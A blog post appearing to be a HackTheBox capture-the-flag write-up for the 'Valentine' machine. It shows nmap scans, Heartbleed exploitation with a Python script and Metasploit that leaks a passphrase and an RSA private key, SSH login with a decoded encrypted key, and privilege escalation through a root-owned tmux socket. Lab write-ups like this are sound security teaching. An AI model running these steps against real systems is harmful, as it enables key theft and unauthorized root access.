---
layout:     post
title:      "Hackthebox - Valentine"
date:       2018-07-28 0:00:00
author:     "W3ndige"
permalink: /:title/
category: Hackthebox
---

Today we're going to walk through the machine from Hackthebox called ***Valentine***.

### Solution

Firstly, let's run a quick `nmap` scan to get some open ports. 

{% highlight bash %}
root@kali:~/hackthebox/valentine# nmap 10.10.10.79
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-09 10:48 EDT
Nmap scan report for 10.10.10.79
Host is up (0.042s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 2.11 seconds
{% endhighlight %}

From here we can start analyzing `http` and `https` services.

{% highlight bash %}
root@kali:~/hackthebox/valentine# curl 10.10.10.79
<center><img src="omg.jpg"/></center>
{% endhighlight %}

Both of them show the same image. 

![Omg](/img/valentine/omg.png){:class="img-responsive center-block"}

It's a logo of heartbleed attack! To make sure that the service is vulnerable, we can run another `nmap` scan with `--script=ssl-heartbleed` option. 

{% highlight bash %}
root@kali:~/hackthebox/valentine# nmap -p 443 -sV --script=ssl-heartbleed 10.10.10.79
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-09 10:53 EDT
Nmap scan report for 10.10.10.79
Host is up (0.038s latency).

PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       http://cvedetails.com/cve/2014-0160/
|       http://www.openssl.org/news/secadv_20140407.txt 
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.06 seconds
{% endhighlight %}

I decided to try out two tools - [this](https://gist.github.com/eelsivart/10174134) python script exploiting this vulnerability and `metasploit` to try and gather as much information as possible. 

{% highlight bash %}
root@kali:~/hackthebox/valentine# touch heartbleed.py 
root@kali:~/hackthebox/valentine# vi heartbleed.py 
root@kali:~/hackthebox/valentine# python heartbleed.py 

defribulator v1.16
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)
Usage: heartbleed.py server [options]

Test and exploit TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

Options:
  -h, --help            show this help message and exit
  -p PORT, --port=PORT  TCP port to test (default: 443)
  -n NUM, --num=NUM     Number of times to connect/loop (default: 1)
  -s, --starttls        Issue STARTTLS command for SMTP/POP/IMAP/FTP/etc...
  -f FILEIN, --filein=FILEIN
                        Specify input file, line delimited, IPs or hostnames
                        or IP:port or hostname:port
  -v, --verbose         Enable verbose output
  -x, --hexdump         Enable hex output
  -r RAWOUTFILE, --rawoutfile=RAWOUTFILE
                        Dump the raw memory contents to a file
  -a ASCIIOUTFILE, --asciioutfile=ASCIIOUTFILE
                        Dump the ascii contents to a file
  -d, --donotdisplay    Do not display returned data on screen
  -e, --extractkey      Attempt to extract RSA Private Key, will exit when
                        found. Choosing this enables -d, do not display
                        returned data on screen.
{% endhighlight %}

Now we can use this tool to simply get the leaked data. 

{% highlight bash %}
root@kali:~/hackthebox/valentine# python heartbleed.py 10.10.10.79 

defribulator v1.16
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: 10.10.10.79:443, 1 times
Sending Client Hello for TLSv1.0
Received Server Hello for TLSv1.0

WARNING: 10.10.10.79:443 returned more data than it should - server is vulnerable!
Please wait... connection attempt 1 of 1
##################################################################

.@....SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==K.Yv...&...=.l....L
{% endhighlight %}

We can see that there is a `$text` variable encoded in base64.

{% highlight bash %}
root@kali:~/hackthebox/valentine# echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" | base64 -d
heartbleedbelievethehype
{% endhighlight %}

Some text, let's save it for later and move to `metasploit` in order to use their scanner. 

{% highlight bash %}
root@kali:~/hackthebox/valentine# msfconsole

msf > use auxiliary/scanner/ssl/openssl_heartbleed
msf auxiliary(scanner/ssl/openssl_heartbleed) > show options

Module options (auxiliary/scanner/ssl/openssl_heartbleed):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   DUMPFILTER                         no        Pattern to filter leaked memory before storing
   MAX_KEYTRIES      50               yes       Max tries to dump key
   RESPONSE_TIMEOUT  10               yes       Number of seconds to wait for a server response
   RHOSTS                             yes       The target address range or CIDR identifier
   RPORT             443              yes       The target port (TCP)
   STATUS_EVERY      5                yes       How many retries until status
   THREADS           1                yes       The number of concurrent threads
   TLS_CALLBACK      None             yes       Protocol to use, "None" to use raw TLS sockets (Accepted: None, SMTP, IMAP, JABBER, POP3, FTP, POSTGRES)
   TLS_VERSION       1.0              yes       TLS/SSL version to use (Accepted: SSLv3, 1.0, 1.1, 1.2)


Auxiliary action:

   Name  Description
   ----  -----------
   SCAN  Check hosts for vulnerability


msf auxiliary(scanner/ssl/openssl_heartbleed) > set RHOSTS 10.10.10.79
RHOSTS => 10.10.10.79
msf auxiliary(scanner/ssl/openssl_heartbleed) > set MAX_KEYTRIES 20000
MAX_KEYTRIES => 20000
msf auxiliary(scanner/ssl/openssl_heartbleed) > show actions

Auxiliary actions:

   Name  Description
   ----  -----------
   DUMP  Dump memory contents
   KEYS  Recover private keys from memory
   SCAN  Check hosts for vulnerability


msf auxiliary(scanner/ssl/openssl_heartbleed) > set ACTION KEYS
ACTION => KEYS
msf auxiliary(scanner/ssl/openssl_heartbleed) > exploit

[*] 10.10.10.79:443       - Scanning for private keys
[*] 10.10.10.79:443       - Getting public key constants...
[*] 10.10.10.79:443       - 2018-07-09 17:07:42 UTC - Starting.
[*] 10.10.10.79:443       - 2018-07-09 17:07:42 UTC - Attempt 0...
[+] 10.10.10.79:443       - 2018-07-09 17:07:47 UTC - Got the private key
[*] 10.10.10.79:443       - 
-----BEGIN RSA PRIVATE KEY-----
MIIEpgIBAAKCAQEAwygXrPgZKkHSij/OeRwZ9PtI+tMvM2tvyJz5o78ZZqihjfki
Yg7hnkVQH1kvrLqVz68jqlTJZEAPJajF3cvEHIcM0nMSLnd2z4lI+zlK4fU9QMO1
moJo9o2Msk0/TwMJwLqtdF1TZLBXakQPH7f2+wWIrrLByt6m+8Vmd0YpdWDQr5Hd
WTA6C4+FIeVdyCIcVup6Lw0nXOKn1i5VRheHItUbZmIlhfoJHDhtGxSeqXrgMU1D
Js6wkebQm0jYz095+a8SRNRl5P93R1aFTTvprdtN6y0pl/hampnDrRcabHOkBB/l
1Y6ox6YgrorgULjxstJI3n2ziQ226G3Ho4JelwIDAQABAoIBAQCWkqd5wE6CSRjt
q/9deC4a04riY/CmJr2vtlXyXi52A6Pqi49YwwyW9fm0xjY/ehK+k+3brOFZ5QcK
0mYgE+iy7gwZj8k2atwTkmPp2bGKF5J0FsxWc0oS+PHWXD19c+Wheyb7gkomhNxd
VDerDGCWGxXzXF6jbRi/ZvYBDvRL59YOvXmdQa3MKykGywUn+NFZvUxICyEma24K
5ABMIWm5cTmDzm5Cd5/wn5Pu4tY0TIzfoa3KnA+M8vpmd4xgRGWGpatFKrM3LqSq
W0+Rr81Ty/R7lr1DkLDKp1ltvCl3pp1Lkoo3Ublk38C6gHHS3Vfs6h+QJfNgjeQu
RyKqm3H5AoGBAM8MF8KO2EtVQUrosnZQfn+2pLbY4n4Q66N3QaBeoqY7UipBJ1r3
jIfupiw5+M1gEXvBgnQmRLwRAA7Wmsh0/eCxeOk7kgNr7W8nNdxwp0Uv06h1CtEq
vFIuXab5pYG5/QKshabSXxY02QuaVgM/vXBTSOO0TC/7Rm6ORJzAxAeTAoGBAPFM
TE9WpalFjB0u+hHNbFRfRet8480wa5702AEDK/cHi0U+R9Z0Va/qm7PtzBP/m4nU
XJwZbvG9O2PKXusGmgIBc/jqSQpQriIvBb27AJiq65Jd7tJ4AiNZm6v/bFChFmWh
dZe1S4vBgnlYoRWHsu+3JJpMJFKZYYl9O/X8ZWdtAoGBAK1DJmL23MP13UTNhAKE
i8deVWp6BteOW1KZCr8kUqIfRDv99+wk+mIKcN7TyIQ9H4RbxEpkd+KVq2G/bxnO
5WFxwogTBLZ+S9xXiLgnQaMhSdNP1rSBOcTf7hk8EqeDt9nT+6hFpbLUmMkf51ii
r2nfGEEM8TC56w+7WGmA2sqnAoGBAOakinBvnwuMmaAvjgJEO57uLlQoXUp9VPFs
kaduE7EdOecm393B90GeW9QBoccf1NlK7naa7OwOd90ry8yU09LE9shfkQ9WDQxJ
rBAt1iUXgvK17Jiq80g818rw6+SqBVGBongvZ5WfkwpQSDDfM49knI0L6NA3If8c
gJrg9UCFAoGBAIetkT/XaN+IV3N/mkBVwLXPcDIP8aGp/qJaA6gd9ThPUh9dB8rI
bntGLbQ1rVg4Rl8NZaMi6vvgllqpecgrTOTDvhdyvWG21ayuyD3kYkPxB91bkUo2
+xJUUVx5lM5NNiefWNB+2RPBdsjSHa0VMYA3E1gjp/WQa9eelevdTBVk
-----END RSA PRIVATE KEY-----

[*] 10.10.10.79:443       - Private key stored in /root/.msf4/loot/20180709130747_default_10.10.10.79_openssl.heartble_729752.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
{% endhighlight %}

Great, we have the private key! Will we be able to log in using it and the string encoded during the previous attack?

{% highlight bash %}
root@kali:~/hackthebox/valentine# mv 20180709130747_default_10.10.10.79_openssl.heartble_729752.txt rsa_key
root@kali:~/hackthebox/valentine# chmod 400 rsa_key

root@kali:~/hackthebox/valentine# ssh -i rsa_key hype@10.10.10.79
hype@10.10.10.79's password: 
Permission denied, please try again.
hype@10.10.10.79's password: 
Permission denied, please try again.
hype@10.10.10.79's password: 
hype@10.10.10.79: Permission denied (publickey,password).
{% endhighlight %}

Unfortunately not. After a few hours of more enumeration, I've noticed another directory in website, together with a `notes.txt` file. 

{% highlight text %}
http://10.10.10.79/dev/notes.txt

To do:

1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don't use the decoder/encoder until any of this is done.
6) Find a better way to take notes.
{% endhighlight %}

In there we have another file. 

{% highlight bash %}
http://10.10.10.79/dev/hype_key

2d 2d 2d 2d 2d 42 45 47 49 4e 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d 0d 0a 50 72 6f 63 2d 54 79 70 65 3a 20 34 2c 45 4e 43 52 59 50 54 45 44 0d 0a 44 45 4b 2d 49 6e 66 6f 3a 20 41 45 53 2d 31 32 38 2d 43 42 43 2c 41 45 42 38 38 43 31 34 30 46 36 39 42 46 32 30 37 34 37 38 38 44 45 32 34 41 45 34 38 44 34 36 0d 0a 0d 0a 44 62 50 72 4f 37 38 6b 65 67 4e 75 6b 31 44 41 71 6c 41 4e 35 6a 62 6a 58 76 30 50 50 73 6f 67 33 6a 64 62 4d 46 53 38 69 45 39 70 33 55 4f 4c 30 6c 46 30 78 66 37 50 7a 6d 72 6b 44 61 38 52 0d 0a 35 79 2f 62 34 36 2b 39 6e 45 70 43 4d 66 54 50 68 4e 75 4a 52 63 57 32 55 32 67 4a 63 4f 46 48 2b 39 52 4a 44 42 43 35 55 4a 4d 55 53 31 2f 67 6a 42 2f 37 2f 4d 79 30 30 4d 77 78 2b 61 49 36 0d 0a 30 45 49 30 53 62 4f 59 55 41 56 31 57 34 45 56 37 6d 39 36 51 73 5a 6a 72 77 4a 76 6e 6a 56 61 66 6d 36 56 73 4b 61 54 50 42 48 70 75 67 63 41 53 76 4d 71 7a 37 36 57 36 61 62 52 5a 65 58 69 0d 0a 45 62 77 36 36 68 6a 46 6d 41 75 34 41 7a 71 63 4d 2f 6b 69 67 4e 52 46 50 59 75 4e 69 58 72 58 73 31 77 2f 64 65 4c 43 71 43 4a 2b 45 61 31 54 38 7a 6c 61 73 36 66 63 6d 68 4d 38 41 2b 38 50 0d 0a 4f 58 42 4b 4e 65 36 6c 31 37 68 4b 61 54 36 77 46 6e 70 35 65 58 4f 61 55 49 48 76 48 6e 76 4f 36 53 63 48 56 57 52 72 5a 37 30 66 63 70 63 70 69 6d 4c 31 77 31 33 54 67 64 64 32 41 69 47 64 0d 0a 70 48 4c 4a 70 59 55 49 49 35 50 75 4f 36 78 2b 4c 53 38 6e 31 72 2f 47 57 4d 71 53 4f 45 69 6d 4e 52 44 31 6a 2f 35 39 2f 34 75 33 52 4f 72 54 43 4b 65 6f 39 44 73 54 52 71 73 32 6b 31 53 48 0d 0a 51 64 57 77 46 77 61 58 62 59 79 54 31 75 78 41 4d 53 6c 35 48 71 39 4f 44 35 48 4a 38 47 30 52 36 4a 49 35 52 76 43 4e 55 51 6a 77 78 30 46 49 54 6a 6a 4d 6a 6e 4c 49 70 78 6a 76 66 71 2b 45 0d 0a 70 30 67 44 30 55 63 79 6c 4b 6d 36 72 43 5a 71 61 63 77 6e 53 64 64 48 57 38 57 33 4c 78 4a 6d 43 78 64 78 57 35 6c 74 35 64 50 6a 41 6b 42 59 52 55 6e 6c 39 31 45 53 43 69 44 34 5a 2b 75 43 0d 0a 4f 6c 36 6a 4c 46 44 32 6b 61 4f 4c 66 75 79 65 65 30 66 59 43 62 37 47 54 71 4f 65 37 45 6d 4d 42 33 66 47 49 77 53 64 57 38 4f 43 38 4e 57 54 6b 77 70 6a 63 30 45 4c 62 6c 55 61 36 75 6c 4f 0d 0a 74 39 67 72 53 6f 73 52 54 43 73 5a 64 31 34 4f 50 74 73 34 62 4c 73 70 4b 78 4d 4d 4f 73 67 6e 4b 6c 6f 58 76 6e 6c 50 4f 53 77 53 70 57 79 39 57 70 36 79 38 58 58 38 2b 46 34 30 72 78 6c 35 0d 0a 58 71 68 44 55 42 68 79 6b 31 43 33 59 50 4f 69 44 75 50 4f 6e 4d 58 61 49 70 65 31 64 67 62 30 4e 64 44 31 4d 39 5a 51 53 4e 55 4c 77 31 44 48 43 47 50 50 34 4a 53 53 78 58 37 42 57 64 44 4b 0d 0a 61 41 6e 57 4a 76 46 67 6c 41 34 6f 46 42 42 56 41 38 75 41 50 4d 66 56 32 58 46 51 6e 6a 77 55 54 35 62 50 4c 43 36 35 74 46 73 74 6f 52 74 54 5a 31 75 53 72 75 61 69 32 37 6b 78 54 6e 4c 51 0d 0a 2b 77 51 38 37 6c 4d 61 64 64 73 31 47 51 4e 65 47 73 4b 53 66 38 52 2f 72 73 52 4b 65 65 4b 63 69 6c 44 65 50 43 6a 65 61 4c 71 74 71 78 6e 68 4e 6f 46 74 67 30 4d 78 74 36 72 32 67 62 31 45 0d 0a 41 6c 6f 51 36 6a 67 35 54 62 6a 35 4a 37 71 75 59 58 5a 50 79 6c 42 6c 6a 4e 70 39 47 56 70 69 6e 50 63 33 4b 70 48 74 74 76 67 62 70 74 66 69 57 45 45 73 5a 59 6e 35 79 5a 50 68 55 72 39 51 0d 0a 72 30 38 70 6b 4f 78 41 72 58 45 32 64 6a 37 65 58 2b 62 71 36 35 36 33 35 4f 4a 36 54 71 48 62 41 6c 54 51 31 52 73 39 50 75 6c 72 53 37 4b 34 53 4c 58 37 6e 59 38 39 2f 52 5a 35 6f 53 51 65 0d 0a 32 56 57 52 79 54 5a 31 46 66 6e 67 4a 53 73 76 39 2b 4d 66 76 7a 33 34 31 6c 62 7a 4f 49 57 6d 6b 37 57 66 45 63 57 63 48 63 31 36 6e 39 56 30 49 62 53 4e 41 4c 6e 6a 54 68 76 45 63 50 6b 79 0d 0a 65 31 42 73 66 53 62 73 66 39 46 67 75 55 5a 6b 67 48 41 6e 6e 66 52 4b 6b 47 56 47 31 4f 56 79 75 77 63 2f 4c 56 6a 6d 62 68 5a 7a 4b 77 4c 68 61 5a 52 4e 64 38 48 45 4d 38 36 66 4e 6f 6a 50 0d 0a 30 39 6e 56 6a 54 61 59 74 57 55 58 6b 30 53 69 31 57 30 32 77 62 75 31 4e 7a 4c 2b 31 54 67 39 49 70 4e 79 49 53 46 43 46 59 6a 53 71 69 79 47 2b 57 55 37 49 77 4b 33 59 55 35 6b 70 33 43 43 0d 0a 64 59 53 63 7a 36 33 51 32 70 51 61 66 78 66 53 62 75 76 34 43 4d 6e 4e 70 64 69 72 56 4b 45 6f 35 6e 52 52 66 4b 2f 69 61 4c 33 58 31 52 33 44 78 56 38 65 53 59 46 4b 46 4c 36 70 71 70 75 58 0d 0a 63 59 35 59 5a 4a 47 41 70 2b 4a 78 73 6e 49 51 39 43 46 79 78 49 74 39 32 66 72 58 7a 6e 73 6a 68 6c 59 61 38 73 76 62 56 4e 4e 66 6b 2f 39 66 79 58 36 6f 70 32 34 72 4c 32 44 79 45 53 70 59 0d 0a 70 6e 73 75 6b 42 43 46 42 6b 5a 48 57 4e 4e 79 65 4e 37 62 35 47 68 54 56 43 6f 64 48 68 7a 48 56 46 65 68 54 75 42 72 70 2b 56 75 50 71 61 71 44 76 4d 43 56 65 31 44 5a 43 62 34 4d 6a 41 6a 0d 0a 4d 73 6c 66 2b 39 78 4b 2b 54 58 45 4c 33 69 63 6d 49 4f 42 52 64 50 79 77 36 65 2f 4a 6c 51 6c 56 52 6c 6d 53 68 46 70 49 38 65 62 2f 38 56 73 54 79 4a 53 65 2b 62 38 35 33 7a 75 56 32 71 4c 0d 0a 73 75 4c 61 42 4d 78 59 4b 6d 33 2b 7a 45 44 49 44 76 65 4b 50 4e 61 61 57 5a 67 45 63 71 78 79 6c 43 43 2f 77 55 79 55 58 6c 4d 4a 35 30 4e 77 36 4a 4e 56 4d 4d 38 4c 65 43 69 69 33 4f 45 57 0d 0a 6c 30 6c 6e 39 4c 31 62 2f 4e 58 70 48 6a 47 61 38 57 48 48 54 6a 6f 49 69 6c 42 35 71 4e 55 79 79 77 53 65 54 42 46 32 61 77 52 6c 58 48 39 42 72 6b 5a 47 34 46 63 34 67 64 6d 57 2f 49 7a 54 0d 0a 52 55 67 5a 6b 62 4d 51 5a 4e 49 49 66 7a 6a 31 51 75 69 6c 52 56 42 6d 2f 46 37 36 59 2f 59 4d 72 6d 6e 4d 39 6b 2f 31 78 53 47 49 73 6b 77 43 55 51 2b 39 35 43 47 48 4a 45 38 4d 6b 68 44 33 0d 0a 2d 2d 2d 2d 2d 45 4e 44 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d
{% endhighlight %}

After converting these values to ASCII system (hex -> ascii), we have another private key. 

{% highlight text %}
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----
{% endhighlight %}

Let's save it once again and try to connect to `ssh`. 

{% highlight bash %}
root@kali:~/hackthebox/valentine# touch private_key
root@kali:~/hackthebox/valentine# vi private_key 
root@kali:~/hackthebox/valentine# chmod 400 private_key 
root@kali:~/hackthebox/valentine# ssh -i private_key hype@10.10.10.79
Enter passphrase for key 'private_key': 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Mon Jul  9 10:46:16 2018 from 10.10.15.212
hype@Valentine:~$ 

hype@Valentine:~$ cd Desktop/
hype@Valentine:~/Desktop$ cat user.txt
<flag>
{% endhighlight%}

Now let's find a way to escalate to root. 

{% highlight bash %}
hype@Valentine:~$ cd /
hype@Valentine:/$ ls -la
total 108
drwxr-xr-x  26 root root  4096 Feb  6 11:56 .
drwxr-xr-x  26 root root  4096 Feb  6 11:56 ..
drwxr-xr-x   2 root root  4096 Dec 11  2017 bin
drwxr-xr-x   3 root root  4096 Feb 16 14:41 boot
drwxr-xr-x   2 root root  4096 Dec 11  2017 cdrom
drwxr-xr-x  13 root root  4060 Jul  9 11:21 dev
drwxr-xr-x   2 root root  4096 Dec 13  2017 devs
drwxr-xr-x   2 root hype  4096 Jul  9 11:21 .devs
drwxr-xr-x 132 root root 12288 Jul  9 11:21 etc
drwxr-xr-x   3 root root  4096 Dec 11  2017 home
lrwxrwxrwx   1 root root    32 Dec 11  2017 initrd.img -> boot/initrd.img-3.2.0-23-generic
drwxr-xr-x  21 root root  4096 Dec 11  2017 lib
drwxr-xr-x   2 root root  4096 Apr 25  2012 lib64
drwx------   2 root root 16384 Dec 11  2017 lost+found
drwxr-xr-x   3 root root  4096 Apr 25  2012 media
drwxr-xr-x   3 root root  4096 Dec 11  2017 mnt
drwx------   2 root root  4096 Dec 13  2017 opt
dr-xr-xr-x 104 root root     0 Jul  9 11:21 proc
drwx------   4 root root  4096 Feb  6 12:00 root
drwxr-xr-x  20 root root   740 Jul  9 11:26 run
drwxr-xr-x   2 root root  4096 Feb 16 14:40 sbin
drwxr-xr-x   2 root root  4096 Mar  5  2012 selinux
drwxr-xr-x   2 root root  4096 Apr 25  2012 srv
drwxr-xr-x  13 root root     0 Jul  9 11:21 sys
drwxrwxrwt   5 root root  4096 Jul  9 11:30 tmp
drwxr-xr-x  10 root root  4096 Apr 25  2012 usr
drwxr-xr-x  14 root root  4096 Feb  6 12:01 var
lrwxrwxrwx   1 root root    29 Dec 11  2017 vmlinuz -> boot/vmlinuz-3.2.0-23-generic
hype@Valentine:/$ cd .devs
hype@Valentine:/.devs$ ls -la
total 8
drwxr-xr-x  2 root hype 4096 Jul  9 11:21 .
drwxr-xr-x 26 root root 4096 Feb  6 11:56 ..
srw-rw----  1 root hype    0 Jul  9 11:21 dev_sess
hype@Valentine:/.devs$ file dev_sess 
dev_sess: socket
{% endhighlight %}

We have a `dev_sess` socket, with `root` owner, but `group` is `hype`. That means we can connect it, as we're in the same group. Let's try it with `tmux` command (you can find it also while checking out bash history). 

{% highlight bash %}
hype@Valentine:/.devs$ tmux -S /.devs/dev_sess

total 8
drwxr-xr-x  2 root hype 4096 Jul  9 11:21 .
drwxr-xr-x 26 root root 4096 Feb  6 11:56 ..
srwxrwx---  1 root hype    0 Jul  9 11:21 dev_sess
root@Valentine:/.devs# cd /root/
root@Valentine:~# ls -la
total 52
drwx------  4 root root 4096 Feb  6 12:00 .
drwxr-xr-x 26 root root 4096 Feb  6 11:56 ..
-rw-------  1 root root  263 Feb 16 14:42 .bash_history
-rw-r--r--  1 root root 3108 Dec 13  2017 .bashrc
drwx------  2 root root 4096 Feb  6 12:00 .cache
-rw-r--r--  1 root root  140 Apr 19  2012 .profile
drwx------  2 root root 4096 Dec 13  2017 .pulse
-rw-------  1 root root  256 Dec 11  2017 .pulse-cookie
-rw-------  1 root root 1024 Feb  5 16:45 .rnd
-rw-r--r--  1 root root   66 Dec 13  2017 .selected_editor
-rw-r--r--  1 root root   73 Dec 13  2017 .tmux.conf
-rwxr-xr-x  1 root root  388 Dec 13  2017 curl.sh
-rw-r--r--  1 root root   33 Dec 13  2017 root.txt
root@Valentine:~# cat root.txt
<flag>
{% endhighlight %}
